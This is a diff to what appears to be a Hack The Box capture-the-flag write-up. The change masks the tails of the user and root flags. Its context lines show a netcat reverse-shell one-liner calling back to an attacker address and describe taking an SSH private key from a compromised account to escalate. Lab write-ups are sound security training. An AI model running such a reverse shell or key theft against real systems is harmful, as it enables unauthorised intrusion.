@@ -91,7 +91,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.198 8888 >/tmp/f
 ```
 **From /var/lib/postgresql/user.txt**:
 
-**user flag**: `HTB{ec9b13ca4d6229cd5cc1e09980965bf7}`
+**user flag**: `HTB{ec9b13ca4d6229cd5cc1e099809XXXXX}`
 
 With attempt to upgrade to interactive shell but after like 3 minutes, the connection just some how keep lossing --> luckily, check home directory(from `/etc/passwd`) which is `/var/lib/postgresql` have `.ssh` --> get `id_rsa` key
 
@@ -133,4 +133,4 @@ whoami # root
 
 **From /root/root.txt**:
 
-**root flag**: `HTB{dd6e058e814260bc70e9bbdef2715849}`
+**root flag**: `HTB{dd6e058e814260bc70e9bbdef27XXXXX}`
